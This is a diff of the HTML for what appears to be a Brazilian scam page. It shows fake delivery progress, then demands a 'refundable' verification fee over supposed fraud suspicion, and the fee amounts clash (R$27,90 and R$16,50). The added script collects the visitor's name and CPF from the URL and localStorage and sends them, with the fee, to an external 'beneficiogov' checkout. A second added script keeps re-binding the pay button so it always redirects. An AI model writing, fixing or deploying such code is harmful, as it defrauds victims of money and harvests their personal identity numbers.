@@ -9,14 +9,78 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
 
+    <!-- Definindo a função ANTES de qualquer script externo para garantir que existe -->
     <script>
-  window.pixelId = "6845ec0d545bd01304237507";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script><script async="" defer="" src="js/pixel.js"></script>
+        function irParaCheckout() {
+            var p = new URLSearchParams(window.location.search);
+            var dest = new URLSearchParams();
+
+            // Tenta pegar nome e CPF da URL primeiro
+            var nome = p.get('nome') || p.get('name') || '';
+            var cpf  = p.get('cpf') || p.get('documento') || p.get('document') || '';
+
+            // Se não veio na URL, tenta pegar do localStorage
+            if (!nome || !cpf) {
+                try {
+                    var stored = localStorage.getItem('urlParams');
+                    if (stored) {
+                        var lsParams = JSON.parse(stored);
+                        nome = nome || lsParams['nome'] || lsParams['name'] || '';
+                        cpf  = cpf  || lsParams['cpf']  || lsParams['documento'] || '';
+                    }
+                } catch(e) {}
+            }
+
+            // Se ainda não achou, tenta userData do localStorage
+            if (!nome || !cpf) {
+                try {
+                    var userData = localStorage.getItem('userData');
+                    if (userData) {
+                        var ud = JSON.parse(userData);
+                        nome = nome || ud['nome'] || ud['name'] || '';
+                        cpf  = cpf  || ud['cpf']  || ud['documento'] || '';
+                    }
+                } catch(e) {}
+            }
+
+            if (nome) dest.set('nome', nome);
+            if (cpf)  dest.set('documento', cpf.replace(/\D/g, ''));
+
+            // Valor desta taxa (R$ 27,90 = 2790 centavos)
+            dest.set('valor', '2790');
+
+            // Passa todos os UTMs e rastreamento
+            ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k) {
+                var v = p.get(k);
+                if (v) dest.set(k, v);
+            });
+
+            // Tenta pegar UTMs do localStorage também
+            try {
+                var stored = localStorage.getItem('urlParams');
+                if (stored) {
+                    var lsP = JSON.parse(stored);
+                    ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k) {
+                        if (!dest.get(k) && lsP[k]) dest.set(k, lsP[k]);
+                    });
+                }
+            } catch(e) {}
+
+            var url = 'https://beneficiogov.vercel.app/checkout1.html?' + dest.toString();
+            console.log('Redirecionando para:', url);
+            window.location.href = url;
+        }
+    </script>
+
+    <script>
+        window.pixelId = "6845ec0d545bd01304237507";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script async="" defer="" src="js/pixel.js"></script>
 
     <link rel="stylesheet" href="css/THjQrcnbUFvp.css">
     <link rel="stylesheet" href="css/ZSbaVWuVCzZc.css">
@@ -42,114 +106,86 @@
             <div class="menu-icon" style="padding-left: 3%;">
                 <img src="images/5aFe3Ak4g3Br.png" style="height: 5vh;" alt="Logo Central Vivara">
             </div>
-
-            <div class="logo-central">
-            </div>
-
+            <div class="logo-central"></div>
             <div class="menu-icon" style="padding-right: 3%;">
                 <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: #ffffff">shopping_cart</span>
             </div>
         </nav>
 
-
         <div class="progress-container">
             <div>
                 <div class="progress-item">
                     <div class="progress-bar" id="bar1"></div>
-
                     <div class="check-container" id="check1">
                         <img src="images/success.gif" alt="Animação" id="img1">
                     </div>
                 </div>
-
                 <p id="text1">Analisando Dados</p>
             </div>
-
             <div>
                 <div class="progress-item">
                     <div class="progress-bar" id="bar2"></div>
-
                     <div class="check-container" id="check2">
                         <img src="images/success.gif" alt="Animação" id="img2">
                     </div>
                 </div>
-
                 <p id="text2">Preparando transferência</p>
             </div>
-
             <div>
                 <div class="progress-item">
                     <div class="progress-bar" id="bar3"></div>
-
                     <div class="check-container" id="check3">
                         <img src="images/failed.gif" alt="Animação" id="img3">
                     </div>
                 </div>
-
                 <p id="text3">Pagamento Efetuado</p>
             </div>
-
             <div>
                 <div class="progress-item">
                     <div class="progress-bar" id="bar4"></div>
-
                     <div class="check-container" id="check4">
                         <img src="images/qlKo5ZF7Eju4.png" alt="Animação" id="img4">
                     </div>
                 </div>
-
                 <p id="text4">Concluido</p>
             </div>
         </div>
 
         <section id="more-information">
             <h1>ATENÇÃO!</h1>
-
             <h2>Confirmação necessária</h2>
-
             <p>
                 Durante a análise do seu pedido, identificamos uma <span class="bold">pendência relacionada à taxa de
                     verificação</span>, necessária para garantir a segurança da entrega e evitar possíveis fraudes.
             </p>
-
             <p>
                 Essa taxa é <span class="bold">reembolsável</span> e será devolvida automaticamente após a confirmação
                 do pagamento.
             </p>
-
             <p>Clique no botão abaixo para calcular e regularizar a taxa.</p>
-
-
             <button id="show-offer" disabled="">CALCULAR TAXA</button>
         </section>
     </div>
 
     <div id="offer-modal" class="modal">
         <div class="modal-content">
-
             <div id="step1">
                 <h1>Verificando pendência</h1>
-
                 <div id="trace" class="progress-bar2"></div>
-
                 <p>Por favor, aguarde enquanto processamos...</p>
             </div>
-
             <div id="step2">
                 <p>MOTIVO DA TAXA:</p>
                 <span id="reason" class="bold">SUSPEITA DE FRAUDE</span><br>
-
                 <p>Foi identificada uma <span class="bold2">taxa obrigatória de validação</span> para garantir a
                     segurança do processo.
                     Após o pagamento, o valor será <span class="bold2">totalmente reembolsado</span>.</p>
-
                 <h1>REGULARIZE AGORA</h1>
-
                 <p>Efetue o pagamento</p>
-
                 <h1 id="value">R$27,90</h1>
 
-                <a onclick="irParaCheckout()">REGULARIZAR TAXA</a>
+                <!-- Botão corrigido: usa onclick com a função definida no <head> -->
+                <a href="javascript:void(0);" onclick="irParaCheckout(); return false;">REGULARIZAR TAXA</a>
 
                 <p>Atenção: Caso o valor de <span class="bold3">R$16,50</span> não seja quitado, o sistema exigirá o
                     pagamento integral de
@@ -163,28 +199,23 @@
     <script src="js/eIAVx7Xy7gwF.js"></script>
     <script src="js/2rsHVW5XnmRB.js" data-utmify-prevent-subids="" async="" defer=""></script>
 
+    <!-- Garante que o botão funciona mesmo que os scripts externos sobrescrevam algo -->
     <script>
-        function irParaCheckout() {
-            var p = new URLSearchParams(window.location.search);
-            var dest = new URLSearchParams();
-
-            // Nome e CPF
-            var nome = p.get('nome') || '';
-            var cpf  = p.get('cpf') || p.get('documento') || '';
-            if (nome) dest.set('nome', nome);
-            if (cpf)  dest.set('documento', cpf);
-
-            // Valor desta taxa (R$ 27,90 = 2790 centavos)
-            dest.set('valor', '2790');
-
-            // Passa todos os UTMs e rastreamento
-            ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k) {
-                var v = p.get(k);
-                if (v) dest.set(k, v);
+        document.addEventListener('DOMContentLoaded', function() {
+            // Aguarda o modal aparecer e reaplica o onclick no link caso tenha sido sobrescrito
+            var observer = new MutationObserver(function() {
+                var links = document.querySelectorAll('#step2 a');
+                links.forEach(function(link) {
+                    link.href = 'javascript:void(0);';
+                    link.onclick = function(e) {
+                        e.preventDefault();
+                        irParaCheckout();
+                        return false;
+                    };
+                });
             });
-
-            window.location.href = 'https://beneficiogov.vercel.app/checkout1.html?' + dest.toString();
-        }
+            observer.observe(document.body, { childList: true, subtree: true });
+        });
     </script>
 
 </body></html>
